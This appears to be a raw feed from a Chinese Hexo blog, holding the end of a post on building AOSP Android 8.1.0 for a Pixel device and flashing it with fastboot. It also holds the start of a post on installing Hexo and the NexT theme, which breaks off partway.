href="https://source.android.com/setup/start/build-numbers">https://source.android.com/setup/start/build-numbers</a><br>驱动下载地址如下，根据Build号搜索与设备对应的驱动<br>Pixel binaries for Android 8.1.0 (OPM1.171019.011)<br><a href="https://developers.google.com/android/drivers#sailfishopm1.171019.011">https://developers.google.com/android/drivers#sailfishopm1.171019.011</a></p><p>下载驱动、增加权限、执行sh解压驱动、删除压缩包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./extract-qcom-sailfish.sh</span><br><span class="line">./extract-google_devices-sailfish.sh</span><br></pre></td></tr></table></figure><h3 id="4、准备编译环境"><a href="#4、准备编译环境" class="headerlink" title="4、准备编译环境"></a>4、准备编译环境</h3><h4 id="4-1、配置java环境并设置环境变量"><a href="#4-1、配置java环境并设置环境变量" class="headerlink" title="4.1、配置java环境并设置环境变量"></a>4.1、配置java环境并设置环境变量</h4><p>切换jdk8并设置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/java java $(<span class="built_in">pwd</span>)/prebuilts/jdk/jdk8/linux-x86/bin/java 1</span><br><span class="line">sudo update-alternatives --install /usr/bin/javac javac $(<span class="built_in">pwd</span>)/prebuilts/jdk/jdk8/linux-x86/bin/javac 1</span><br><span class="line">sudo update-alternatives --<span class="built_in">set</span> java $(<span class="built_in">pwd</span>)/prebuilts/jdk/jdk8/linux-x86/bin/java</span><br><span class="line">sudo update-alternatives --<span class="built_in">set</span> javac $(<span class="built_in">pwd</span>)/prebuilts/jdk/jdk8/linux-x86/bin/javac</span><br></pre></td></tr></table></figure><p>设置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export JAVA_HOME=<span class="subst">$(pwd)</span>/prebuilts/jdk/jdk8/linux-x86/&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/bin:<span class="variable">$JAVA_HOME</span>/bin&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export LC_ALL=C&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><h4 id="4-2、再次调整python优先级（用2-7编译）"><a href="#4-2、再次调整python优先级（用2-7编译）" class="headerlink" title="4.2、再次调整python优先级（用2.7编译）"></a>4.2、再次调整python优先级（用2.7编译）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python2 150</span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python3 100</span><br></pre></td></tr></table></figure><h4 id="4-3、下载编译依赖"><a href="#4-3、下载编译依赖" class="headerlink" title="4.3、下载编译依赖"></a>4.3、下载编译依赖</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install bison tree</span><br><span class="line">sudo apt install libc6:i386 libncurses5 libncurses5:i386 libstdc++6:i386 libxml2-utils curl</span><br><span class="line">sudo apt install m4</span><br></pre></td></tr></table></figure><h3 id="5、开始编译"><a href="#5、开始编译" class="headerlink" title="5、开始编译"></a>5、开始编译</h3><p>编译环境初始化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> build/envsetup.sh</span><br></pre></td></tr></table></figure><p>选择编译目标</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lunch aosp_sailfish-userdebug</span><br></pre></td></tr></table></figure><p>执行编译，参与编译的线程并不是越多越好，通常是根据你机器 cup 的核心来确定，公式为：core * 2，即当前 cpu 的核心的 2 倍。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">make -j8</span><br><span class="line">============================================</span><br><span class="line">PLATFORM_VERSION_CODENAME=REL</span><br><span class="line">PLATFORM_VERSION=8.1.0</span><br><span class="line">TARGET_PRODUCT=aosp_sailfish</span><br><span class="line">TARGET_BUILD_VARIANT=userdebug</span><br><span class="line">TARGET_BUILD_TYPE=release</span><br><span class="line">TARGET_ARCH=arm64</span><br><span class="line">TARGET_ARCH_VARIANT=armv8-a</span><br><span class="line">TARGET_CPU_VARIANT=kryo</span><br><span class="line">TARGET_2ND_ARCH=arm</span><br><span class="line">TARGET_2ND_ARCH_VARIANT=armv7-a-neon</span><br><span class="line">TARGET_2ND_CPU_VARIANT=kryo</span><br><span class="line">HOST_ARCH=x86_64</span><br><span class="line">HOST_2ND_ARCH=x86</span><br><span class="line">HOST_OS=linux</span><br><span class="line">HOST_OS_EXTRA=Linux-4.4.0-41-generic-x86_64-with-Ubuntu-16.04-xenial</span><br><span class="line">HOST_CROSS_OS=windows</span><br><span class="line">HOST_CROSS_ARCH=x86</span><br><span class="line">HOST_CROSS_2ND_ARCH=x86_64</span><br><span class="line">HOST_BUILD_TYPE=release</span><br><span class="line">BUILD_ID=OPM1.171019.011</span><br><span class="line">OUT_DIR=out</span><br><span class="line">============================================</span><br><span class="line">[44/44] bootstrap out/soong/.minibootstrap/build.ninja.in</span><br><span class="line">[4/4] out/soong/.bootstrap/bin/minibp out/soong/.bootstrap/build.ninja</span><br><span class="line">[860/861] glob vendor/*/*/Android.bp</span><br><span class="line">[54/54] out/soong/.bootstrap/bin/soong_build out/soong/build.ninja</span><br><span class="line">out/build-aosp_sailfish.ninja is missing, regenerating...</span><br><span class="line">[680/1095] including ./system/sepolicy/Android.mk ...</span><br></pre></td></tr></table></figure><h3 id="6、刷机"><a href="#6、刷机" class="headerlink" title="6、刷机"></a>6、刷机</h3><p>将各个img文件整理到一个文件夹中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">owner@ubuntu:/media/owner/Code$ <span class="built_in">mkdir</span> 4</span><br><span class="line">owner@ubuntu:/media/owner/Code$ <span class="built_in">cd</span> 4</span><br><span class="line">owner@ubuntu:/media/owner/Code/4$ <span class="built_in">cp</span> ../backup/sailfish-opm1.171019.011/bootloader-sailfish-8996-012001-1710040120.img .</span><br><span class="line">owner@ubuntu:/media/owner/Code/4$ <span class="built_in">cp</span> ../backup/sailfish-opm1.171019.011/radio-sailfish-8996-130091-1710201747.img .</span><br><span class="line">owner@ubuntu:/media/owner/Code/4$ <span class="built_in">cp</span> ../srcAndroid_8.1.0_r1/out/target/product/sailfish/*.img .</span><br><span class="line">owner@ubuntu:/media/owner/Code/4$ <span class="built_in">cp</span> ../srcAndroid_8.1.0_r1/out/target/product/sailfish/android-info.txt .</span><br><span class="line">owner@ubuntu:/media/owner/Code/4$ <span class="built_in">ls</span> -l</span><br><span class="line">total 1472176</span><br><span class="line">-rw-rw-r-- 1 owner owner         23 Jan 26 17:54 android-info.txt</span><br><span class="line">-rw-rw-r-- 1 owner owner   29648168 Jan 26 17:48 boot.img</span><br><span class="line">-rw-r----- 1 owner owner   33021952 Jan 26 17:47 bootloader-sailfish-8996-012001-1710040120.img</span><br><span class="line">-rw-r----- 1 owner owner   58695680 Jan 26 17:47 radio-sailfish-8996-130091-1710201747.img</span><br><span class="line">-rw-rw-r-- 1 owner owner    1134422 Jan 26 17:48 ramdisk.img</span><br><span class="line">-rw-rw-r-- 1 owner owner    8601229 Jan 26 17:48 ramdisk-recovery.img</span><br><span class="line">-rw-rw-r-- 1 owner owner 1008726296 Jan 26 17:48 system.img</span><br><span class="line">-rw-rw-r-- 1 owner owner  110813488 Jan 26 17:48 system_other.img</span><br><span class="line">-rw-rw-r-- 1 owner owner   14025164 Jan 26 17:48 userdata.img</span><br><span class="line">-rw-r--r-- 1 owner owner  242806944 Jan 26 17:49 vendor.img</span><br></pre></td></tr></table></figure><p>可以用adb查看下手机刷机前的系统编译日期，对比下刷机之后的日期</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell getprop ro.build.date</span><br></pre></td></tr></table></figure><p>刷机操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">owner@ubuntu:/media/owner/Code/4$ adb reboot bootloader</span><br><span class="line">owner@ubuntu:/media/owner/Code/4$ sudo ANDROID_PRODUCT_OUT=. ../srcAndroid_8.1.0_r1/out/host/linux-x86/bin/fastboot flashall -w</span><br></pre></td></tr></table></figure><h3 id="7、编译出错总结"><a href="#7、编译出错总结" class="headerlink" title="7、编译出错总结"></a>7、编译出错总结</h3><p>错误1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FAILED: out/target/common/obj/all-event-log-tags.txt</span><br><span class="line">/build/tools/merge-event-log-tags.py<span class="string">&quot;, line 51</span></span><br></pre></td></tr></table></figure><p>解决方法：切换默认python为python2：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python2 150</span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python3 100</span><br></pre></td></tr></table></figure><p>错误2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FAILED: out/target/product/sailfish/obj/STATIC_LIBRARIES/libedify_intermediates/lexer.cpp</span><br></pre></td></tr></table></figure><p>解决方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LC_ALL=C</span><br></pre></td></tr></table></figure><p>错误3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ANDROID_DATA no <span class="built_in">set</span></span><br></pre></td></tr></table></figure><p>解决方法：不要使用最新版kali，会报ANDROID_DATA no set异常，不要使用最新版ubuntu，编译到80%左右会一直卡住。建议用ubuntu20.x进行编译，四小时左右就可以完成</p><h3 id="8、其他知识补充"><a href="#8、其他知识补充" class="headerlink" title="8、其他知识补充"></a>8、其他知识补充</h3><ul><li><p>fastboot flashall<br>  fastboot flashall -w<br>  -w 选项会擦除设备上的 &#x2F;data 分区；该选项在第一次刷写特定设备时可以加上，其他情况下不加也行。<br>  刷写顺利的话，终端打印如下画面，则说明刷机成功了，此时机器会自动重启，稍等机器自动重启即可。</p><p>  如果不想刷写所有分区，可以单独刷写某个指定分区，具体的命令为：<br>  fastboot flash &lt;分区名&gt; &lt;镜像文件名.img&gt;<br>  其中，&lt;分区名&gt; 指的是要刷写到哪个分区，比如 system、userdata 等；&lt;镜像文件名.img&gt; 指的是要刷写的 img 文件名称。<br>  例如，如果想单独刷写 system.img，则可以输入以下命令：<br>  fastboot flash system system.img<br>  刷写完成后，不能直接简单的重启设备。需要执行以下命令来重新启动设备：<br>  fastboot reboot<br>  该命令会使设备从 fastboot 模式退出，并自动重启到正常的 Android 系统中。</p></li><li><p>编译时要求的python版本<br>  python2.7和python版本大于3.6及以上（ubuntu16.04自带的是python2.7和python3.5）</p><p>  python3.8.1更新升级<br>  1，下载python（附件中），可以直接下载到电脑中，然后拖动到虚拟机上，（目录：home&#x2F;zhenglin&#x2F;）然后解压。<br>  2，解压：tar zxvf Python-3.8.1.tgz 得到 Python-3.8.1文件夹，然后进入该目录： cd Python-3.8.1<br>  3，创建安装目录，mkdir &#x2F;usr&#x2F;local&#x2F;python3.8&#x2F;<br>  4，配置安装路径：.&#x2F;configure –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;python3.8<br>  4，安装：make<br>  5，编译： make install<br>  6，安装完成后，运行make clean：删除临时的无效文件。<br>  7，建立python3的软链接<br>  安装完成后，建立软连接。如果&#x2F;usr&#x2F;bin&#x2F;python3连接已经存在了，则删掉python3，然后再输入如下命令：<br>  ln -s &#x2F;usr&#x2F;local&#x2F;python3.8&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;python3<br>  ln -s &#x2F;usr&#x2F;local&#x2F;python3.8&#x2F;bin&#x2F;pip3 &#x2F;usr&#x2F;bin&#x2F;pip3<br>  注意：bin后面是python3。自己没注意一直写bin&#x2F;python3.8<br>  8，检验：输入python3检查python版本是否更新，输入pip3看是否正常<br>  输入python，确认python的指向。如果不是最新安装的，需要切换python连接。<br>  切换python：</p><p>  设置优先级, 数值越大, 优先级越高。优先级高 ，系统会自动选择优先级高的python</p><p>  sudo update-alternatives –install &#x2F;usr&#x2F;bin&#x2F;python python &#x2F;usr&#x2F;bin&#x2F;python2 100<br>  sudo update-alternatives –install &#x2F;usr&#x2F;bin&#x2F;python python &#x2F;usr&#x2F;bin&#x2F;python3 150</p><p>  9，python环境变量配置<br>  将安装的python路径：&#x2F;usr&#x2F;local&#x2F;python3.8&#x2F;bin加入PATH（在&#x2F;etc&#x2F;profile文件下 添加）<br>  最后，输入python3和python验证版本是否更新，将python和python3的软链接都最终指向最终升级后的python版本。</p></li><li><p>各个img简介<br>  android 系统映射文件</p><p>  img名称img描述<br>  system.imgAndroid系统运行的程序包,framework就在此img中。挂载到&#x2F;system下<br>  boot.img包含内核启动参数<br>  ramdisk.img小型文件系统，是android系统启动的关键。包含了android 根目录的镜像<br>  userdata.img各程数据存储所在，被挂载到&#x2F;data目录下<br>  cache.img存储系统或用户应用产生的临时数据，通常的镜像文件名为chche.img</p><p>  作者：过期的薯条<br>  链接：<a href="https://www.jianshu.com/p/18ba1a7412f6">https://www.jianshu.com/p/18ba1a7412f6</a><br>  来源：简书<br>  著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></li><li><p>编译源码<br>  初始化环境，命令：执行envsetup.sh 这个脚本<br>  source build&#x2F;envsetup.sh<br>  然后选择编译的目标模式，有3种可选，分别是<br>  user ：用户模式，限制最多，如果编译作为上市产品，那么就用这种模式，此模式就像是是正常的手机ROM那样，没有root权限，默认关闭了各种打印<br>  userdebug ：提供了root权限，也可以进行debug，适合内测。<br>  eng：基本上开放了全部权限，而且还带了一些额外的debug工具，开发阶段当然选择此模式了。一般选择eng编译模式<br>  lunch ，设置编译的平台。一般选择：lunch aosp_arm64-eng (或lunch aosp_arm-eng：32位操作系统)<br>  然后设定编译线程数量且真正开始编译，这里的-j4参数，这里是整个系统编译</p><p>  make -j4<br>  系统编译完成后，我们才能单独编译某个模块，也可以直接启动模拟器，检查系统编译后的效果<br>  mm 或mmm packages&#x2F;apps&#x2F;Launcher2&#x2F;</p></li><li><p>启动模拟器<br>  系统编译完成后，就启动虚拟机，在虚拟机上安装的就是刚编译的系统了。<br>  source build&#x2F;envsetup.sh<br>  lunch (选择刚才你设置的目标版本,比如这里了我选择的是2，如果我们 lunch 选中的编译目标是 1-6， 那么我们可以直接执行如下命令运行虚拟机看效果了)<br>  emulator</p></li><li><p>系统编译：<br>  第一次下载完成后，一定要直接编译整个系统<br>  在源码根目录，make -j4 注意：make -j8指定线程过多，可能导致编译失败</p></li><li><p>模块编译<br>  除了通过make命令编译可以整个android源码外，还可以用mm，mmm命令。<br>  1，首先要在源码根目录下初始化编译环境（source build&#x2F;evensetup.sh）,例如我的源码根目录：home&#x2F;zhenglin&#x2F;Androidsource&#x2F;sourceCode&#x2F;,目的：将envsetup.sh里的所有用到的命令加载到环境变量里去<br>  2，然后选择编译目标（lunch 8或者lunch aosp_arm64-eng），<br>  3，再进入对应的模块代码下输入mm命令 或者mmm </p></li><li><p>SDK编译<br>  SDK的编译和模块编译非常相似,其命令如下:<br>  首先是初始化编译环境: source build&#x2F;envsetup.sh<br>  接下来是设定编译目标 ：lunch sdk-eng<br>  最后编译SDK ： make sdk<br>  编译完成,在out&#x2F;host&#x2F;linux-x86&#x2F;sdk，看到sdk文件了。<br>  编译后文件生成目录：<br>  android.jar：&#x2F;out&#x2F;target&#x2F;common&#x2F;obj&#x2F;PACKAGING&#x2F;android_jar_intermediates&#x2F;android.jar<br>  linux环境系统文件：.&#x2F;out&#x2F;host&#x2F;linux-x86&#x2F;sdk&#x2F;sdk&#x2F;android-sdk_eng.root_linux-x86.zip</p></li><li><p>android源码编译，m clobber和make clean，分别做什么，有什么区别<br>  在Android源码编译过程中，使用m clobber和make clean命令可以清理编译生成的文件和目录。它们的作用和区别如下：</p><p>  m clobber：m clobber是一个Android源码编译系统提供的高级命令，用于清理整个编译目录。它会删除构建过程中生成的所有文件和目录，包括编译生成的二进制文件、中间文件、临时文件以及构建输出的目录结构。使用m clobber命令后，编译目录将恢复到初始状态，需要重新执行完整的编译过程。</p><p>  make clean：make clean是一个通用的GNU make命令，用于清理构建过程中生成的中间文件。它会删除编译生成的临时文件、目标文件和其他编译过程中产生的中间文件，但不会删除构建输出的目录结构。使用make clean命令后，可以在不重新执行完整编译过程的情况下，清理编译生成的中间文件，以便重新编译修改过的源代码。</p><p>  总结：<br>  m clobber用于清理整个编译目录，包括所有生成的文件和目录，需要重新执行完整的编译过程。<br>  make clean用于清理编译生成的中间文件，但保留构建输出的目录结构，可以在不重新编译的情况下清理中间文件。</p></li></ul><h3 id="9、参考"><a href="#9、参考" class="headerlink" title="9、参考"></a>9、参考</h3><p>启动emulator，但是模拟器可能不允许对 system 进行修改。即使mount -o rw,remount -t ext4 &#x2F;system重新挂载也不能RW。其实可以在启动的时候，添加-writable-system参数。<br><a href="https://yourbay.me/all-about-tech/2019/06/19/aosp-sync-compile/">https://yourbay.me/all-about-tech/2019/06/19/aosp-sync-compile/</a></p><p>坑：不要使用最新版kali，会报ANDROID_DATA no set异常，不要使用最新版ubuntu，编译到80%左右会一直卡住。建议用ubuntu20.x进行编译，四小时左右就可以完成<br><a href="https://blog.csdn.net/a1663049254/article/details/130546056">https://blog.csdn.net/a1663049254/article/details/130546056</a></p><p>kali2022系统AOSP源码android-8.1.0_r1编译<br><a href="https://blog.csdn.net/StepTp/article/details/123242903">https://blog.csdn.net/StepTp/article/details/123242903</a></p><p>kali编译aosp和xposed<br><a href="https://blog.csdn.net/Qwertyuiop2016/article/details/120920400">https://blog.csdn.net/Qwertyuiop2016/article/details/120920400</a><br>除.repo文件夹，其他均可以随意删除，比如你可以直接rm .&#x2F;*，这会把所有的非隐藏文件删除掉，即只保留.repo。下次想在编译只需要再次运行repo init和repo sync -l又可以得到某个分支的源码了。</p><p>AOSP源码编译android-8.1.0_r1记录<br>kali 2020.4为基础环境<br><a href="https://blog.seeflower.dev/archives/12/">https://blog.seeflower.dev/archives/12/</a><br><a href="https://github.com/heyhu/AndroidReverseStudy/blob/master/Android/B01/README.md">https://github.com/heyhu/AndroidReverseStudy/blob/master/Android/B01/README.md</a></p><p>Ubuntu（16.0.4）上编译android8.1源码（资料最全版本）<br><a href="http://code.js-code.com/campc/63716.html">http://code.js-code.com/campc/63716.html</a></p><p>如果要重新编译，如果重启后要编译<br><a href="https://www.jianshu.com/p/658b030c077e">https://www.jianshu.com/p/658b030c077e</a></p><p>刷机和生成IDE导入的工程文件<br>原文链接：<a href="https://blog.csdn.net/CTO_1649900265/article/details/132948050">https://blog.csdn.net/CTO_1649900265/article/details/132948050</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> aosp </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo 安装和配置</title>
      <link href="/2024/02/04/hexo-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/02/04/hexo-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="1、hexo-安装命令"><a href="#1、hexo-安装命令" class="headerlink" title="1、hexo 安装命令"></a>1、hexo 安装命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Owners-MacBook-Pro: $ npm install hexo-cli -g</span><br><span class="line">Owners-MacBook-Pro: $ hexo init w4lden</span><br><span class="line">Owners-MacBook-Pro: $ <span class="built_in">cd</span> w4lden</span><br><span class="line">Owners-MacBook-Pro:w4lden $ npm install</span><br><span class="line">Owners-MacBook-Pro:w4lden $ hexo server</span><br></pre></td></tr></table></figure><h3 id="2、写博客"><a href="#2、写博客" class="headerlink" title="2、写博客"></a>2、写博客</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Owners-MacBook-Pro:w4lden $ hexo new <span class="string">&quot;博客题目&quot;</span></span><br></pre></td></tr></table></figure><p>编辑博客</p><h3 id="3、生成和开启本地服务"><a href="#3、生成和开启本地服务" class="headerlink" title="3、生成和开启本地服务"></a>3、生成和开启本地服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Owners-MacBook-Pro:w4lden $ hexo g</span><br><span class="line">Owners-MacBook-Pro:w4lden $ hexo s</span><br><span class="line">INFO  Validating config</span><br><span class="line">INFO  Start processing</span><br><span class="line">INFO  Hexo is running at http://localhost:4000/ . Press Ctrl+C to stop.</span><br></pre></td></tr></table></figure><h3 id="4、发布"><a href="#4、发布" class="headerlink" title="4、发布"></a>4、发布</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Owners-MacBook-Pro:w4lden $ hexo d</span><br><span class="line">INFO  Validating config</span><br><span class="line">ERROR Deployer not found: git</span><br></pre></td></tr></table></figure><p>出错，应该安装hexo-deployer-git并配置git账号，以及设置好本地ssh key并在gitpages配置其pubkey</p><h4 id="4-1、安装hexo-deployer-git"><a href="#4-1、安装hexo-deployer-git" class="headerlink" title="4.1、安装hexo-deployer-git"></a>4.1、安装hexo-deployer-git</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Owners-MacBook-Pro:w4lden $ npm install hexo-deployer-git --save</span><br><span class="line">added 11 packages, and audited 251 packages <span class="keyword">in</span> 8s</span><br><span class="line"></span><br><span class="line">28 packages are looking <span class="keyword">for</span> funding</span><br><span class="line">  run `npm fund` <span class="keyword">for</span> details</span><br><span class="line"></span><br><span class="line">found 0 vulnerabilities</span><br></pre></td></tr></table></figure><h4 id="4-2、配置git账号"><a href="#4-2、配置git账号" class="headerlink" title="4.2、配置git账号"></a>4.2、配置git账号</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email <span class="string">&quot;you@example.com&quot;</span></span><br><span class="line">git config --global user.name <span class="string">&quot;Your Name&quot;</span></span><br></pre></td></tr></table></figure><h4 id="4-3、设置好本地ssh-key并在gitpages配置其pubkey"><a href="#4-3、设置好本地ssh-key并在gitpages配置其pubkey" class="headerlink" title="4.3、设置好本地ssh key并在gitpages配置其pubkey"></a>4.3、设置好本地ssh key并在gitpages配置其pubkey</h4><p>略</p><h3 id="5、美化hexo"><a href="#5、美化hexo" class="headerlink" title="5、美化hexo"></a>5、美化hexo</h3><h4 id="5-1、安装next主题"><a href="#5-1、安装next主题" class="headerlink" title="5.1、安装next主题"></a>5.1、安装next主题</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Owners-MacBook-Pro:w4lden $ npm install hexo-theme-next</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Owners-MacBook-Pro:w4lden $ git <span class="built_in">clone</span> https://github.com/next-theme/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><p>修改hexo的配置文件和next主题的配置文件，主要是开启menu、选择主题、去掉索引栏的索引标号（1.2.3.）等。</p><h4 id="5-2、menu自定义以下目录"><a href="#5-2、menu自定义以下目录" class="headerlink" title="5.2、menu自定义以下目录"></a>5.2、menu自定义以下目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Owners-MacBook-Pro:w4lden $ hexo new page <span class="string">&quot;about&quot;</span></span><br><span class="line">Owners-MacBook-Pro:w4lden $ hexo new page <span class="string">&quot;tags&quot;</span></span><br><span class="line">Owners-MacBook-Pro:w4lden $ hexo new page <span class="string">&quot;categories&quot;</span></span><br><span class="line">Owners-MacBook-Pro:w4lden $ hexo new page <span class="string">&quot;404&quot;</span></span><br><span class="line">Owners-MacBook-Pro:w4lden $ ll <span class="built_in">source</span></span><br><span class="line">total 0</span><br><span class="line">drwx------@  3 owner  staff    96 Feb  2 22:32 tags</span><br><span class="line">drwxr-xr-x@  7 owner  staff   224 Feb  2 22:32 .</span><br><span class="line">drwx------@  5 owner  staff   160 Feb  2 22:31 categories</span><br><span class="line">drwx------@  3 owner  staff    96 Feb  2 22:31 404</span><br><span class="line">drwxr-xr-x@ 55 owner  staff  1760 Feb  2 22:28 _posts</span><br><span class="line">drwx------@  3 owner  staff    96 Feb  2 22:26 about</span><br><span class="line">drwxr-xr-x@ 17 owner  staff   544 Feb  2 19:46 ..</span><br></pre></td></tr></table></figure><h4 id="5-3、安装插件，用于生成博客索引数据"><a href="#5-3、安装插件，用于生成博客索引数据" class="headerlink" title="5.3、安装插件，用于生成博客索引数据"></a>5.3、安装插件，用于生成博客索引数据</h4><p>在博客根目录下执行下列命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Owners-MacBook-Pro:w4lden $ npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>配置_config.yml文件</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Local Search</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/next-theme/hexo-generator-searchdb</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># If auto, trigger search by changing input.</span></span><br><span class="line">  <span class="comment"># If manual, trigger search by pressing enter key or search button.</span></span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span></span><br><span class="line">  <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><h4 id="5-4、添加右上角github图标"><a href="#5-4、添加右上角github图标" class="headerlink" title="5.4、添加右上角github图标"></a>5.4、添加右上角github图标</h4><h5 id="5-4-1、首先到GitHub-Corners或者GitHub-Ribbons选择自己喜欢的图标，然后copy相应的代码。"><a href="#5-4-1、首先到GitHub-Corners或者GitHub-Ribbons选择自己喜欢的图标，然后copy相应的代码。" class="headerlink" title="5.4.1、首先到GitHub Corners或者GitHub 